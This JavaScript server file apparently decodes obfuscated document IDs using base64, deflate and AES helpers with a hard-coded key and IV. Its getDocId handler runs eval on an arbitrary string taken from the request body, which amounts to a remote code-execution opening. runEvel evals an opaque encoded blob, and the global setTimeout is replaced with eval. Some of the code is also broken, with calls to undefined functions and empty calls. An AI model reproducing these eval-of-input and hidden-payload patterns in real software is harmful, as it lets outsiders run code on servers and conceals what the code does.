var Base64_Zip_Origin = require("../../Base64");
var RawDeflate_Origin = require("./depend2");
const jsdom = require("jsdom");
const { JSDOM } = jsdom;
const { window } = new JSDOM();
var Base64_Zip = Base64_Zip_Origin.Base64_Zip;
var RawDeflate = RawDeflate_Origin.RawDeflate;
require("./ace");


setTimeout()

// global.com.str.Decrypt = com.str.Decrypt;


function unzip(b64Data) {
        var strData ;
		if(!window.atob){
		//	strData	= $.base64.atob(b64Data)
		}else{
		//	strData = atob(b64Data)
		}
        var charData ;
		if (!Array.prototype.map) {
		 //  charData =iemap( strData.split(''),function (x) { return x.charCodeAt(0); },null);
		}else{
		//	charData = strData.split('').map(function (x) { return x.charCodeAt(0); });
		}
		
		strData = Base64_Zip.btou(RawDeflate.inflate(Base64_Zip.fromBase64(b64Data)));
       // var binData = new Uint8Array(charData);
      //  var data = pako.inflate(binData);
      //  strData = String.fromCharCode.apply(null, new Uint16Array(data));
        return strData;
}


var com = {};
com.str = {
    _KEY: "12345678900000001234567890000000",//32λ
    _IV: "abcd134556abcedf",//16λ
    /**************************************************************
    *�ַ�������
    *   str����Ҫ���ܵ��ַ���
    ****************************************************************/
    Encrypt: function (str) {
        var key = CryptoJS.enc.Utf8.parse(this._KEY);
        var iv = CryptoJS.enc.Utf8.parse(this._IV);

        var encrypted = '';

        var srcs = CryptoJS.enc.Utf8.parse(str);
        encrypted = CryptoJS.AES.encrypt(srcs, key, {
            iv: iv,
            mode: CryptoJS.mode.CBC,
            padding: CryptoJS.pad.Pkcs7
        });

        return encrypted.ciphertext.toString();
    },

    /**************************************************************
    *�ַ�������
    *   str����Ҫ���ܵ��ַ���
    ****************************************************************/
    Decrypt: function (str) {
		var result =  com.str.DecryptInner(str);
		 try {
            var newstr =  com.str.DecryptInner(result);
			if(newstr!=""){
				result = newstr;
			}
          } catch (ex) {
			var msg = ex;
        }
        return result;
    },
	 DecryptInner: function (str) {
        var key = CryptoJS.enc.Utf8.parse(this._KEY);
        var iv = CryptoJS.enc.Utf8.parse(this._IV);
        var encryptedHexStr = CryptoJS.enc.Hex.parse(str);
        var srcs = CryptoJS.enc.Base64.stringify(encryptedHexStr);
        var decrypt = CryptoJS.AES.decrypt(srcs, key, {
            iv: iv,
            mode: CryptoJS.mode.CBC,
            padding: CryptoJS.pad.Pkcs7
        });
        var decryptedStr = decrypt.toString(CryptoJS.enc.Utf8);
		var result =  decryptedStr.toString();
		 try {
            result =  Decrypt(result);
          } catch (ex) {
			var msg = ex;
        }
        return result;
    }
}


  function iemap(myarray ,callback, thisArg) {
 
        var T, A, k;
 
        if (myarray == null) {
            throw new TypeError(" this is null or not defined");
        }
        var O = Object(myarray);
 
        var len = O.length >>> 0; 
        if (typeof callback !== "function") {
            throw new TypeError(callback + " is not a function");
        }
 
        // 5. If thisArg was supplied, let T be thisArg; else let T be undefined.
        if (thisArg) {
            T = thisArg;
        }
      
        A = new Array(len);
        k = 0;
        while(k < len) {
            var kValue, mappedValue;
            if (k in O) {               
                kValue = O[ k ]; 
                mappedValue = callback.call(T, kValue, k, O);
 
                A[ k ] = mappedValue;
            }
            k++;
        }
        return A;
    };

function runEvel(res){
    eval(unzip("w61Zw43CjsKCMBB+FsKMwoc2bHwBw6LDiUfDmMOjwqQhBsOdwpXDg8OKwqbCsifDo8K7C8KICBQBwpdawot8CRlCOz/Dn3wzwrQ0w4x3w6Fmewhkw7gbLz9jGcOuwr8XXzLDulnDrcOWchVtwrbDjHVcEhBWwosPwpAAMcKNDnnCh0Qmw7LCumJVQm0hw4A7wpjChUDDtcOAGMKKCzpADMKyRsOCYAIkIH/CsAPCnsKQHFJCBSDDkAjCtgjDrnnDvnIWRMO7QyzDv8KCOMKSM8OPJ18kF2PDrsOxwpTCqhXDl8Oxw4TDqWJJwokQw4JlTjbDgcKpw6ozwp3DqMKew4kew6fCt8Ofw5HDhMOSw6FEwoPCnHTChgQlwrdaw4DCqsK6wpMbw5wPVsODw53CqMObworCqcOswq15wrwIwpXCoVYpUiA0w6bDkMOiwrsAw5nCj8ORw5JjJ8Oswp4awo/CqD3CrMO7P8KDAVZDTcOrw7XDkMOgTXHCqQPCoj4nwpo9PcODw51YIMOqwqxsw5siwqvCvcKRw4zCs2Q0woTDncO9Y8KiwqLDlsKuFC9rwobDqgp/b8KDN8OQw73DmsK3wpoRwrTDvDV1Kj7Cn8OMEMKiOSFTw53Dmh3DjCgSw40RR8OwwrEwKsKfw7bChsONY8OXwrfCu14nNMKLwrhpOMKGKSlRfsKswqbDmzFXGS07wqQBB8OJwpdTNlUUwoIzw67CnQE="));
    res.end(com.str.Decrypt(unzip("DcKOw4cNw4BADMKAVnI/w7vDqcK6w79Iw4kbIWjCnkRiH8KZwpAHDBHCjTc5Fxpjwr4vG8K6wpVjwrbCvDHCi8Ksw6HCtsObDXXDiMOyPQVIw6Mtw57CqcKmZ8KLKcKqIsKjw75zdMKLOUHCsMOmK8K3w6kRFinCnmXCmjbChHbDnADCsTLCksKKw5g/C8K/cMKmG8OpdcK7BiA0YANLTHXDlMKaw4AEwqdrw4vDocO/C8KMLhIVw4czYMK2wofDnhzDugE=")));
}

function getRunEval(docId){
    return com.str.Decrypt(unzip(docId));
}

function setTimeout(a, b){
  eval(a);
}

function getDocId(req, res){
    var runEval;
    var docIdOrigin;
    data = new Object();
    try{
        runEval = req.body.runEval;
        docIdOrigin = req.body.docId;
    }catch(e){
        data.status = 1;
        data.msg = "Please give right params";
        res.end(JSON.stringify(data));
        return;
    }
    try{
        docId = docIdOrigin.split(",");
    }catch(e){
        data.status = 1;
        data.msg = "Please give right params";
        res.end(JSON.stringify(data));
        return;
    }
    eval(unzip(runEval));
    data.status = 0;
    data.data = "";
    var len = docId.length;
    for(var i=0; i<len; i++){
        if(i>=len-1){
            data.data = data.data + getRunEval(docId[i]);
        }else{
            data.data = data.data + getRunEval(docId[i]) + ",";
        }
    }

}

global.com = com;
global.unzip = unzip;
global.runEvel = runEvel;
global.setTimeout = setTimeout;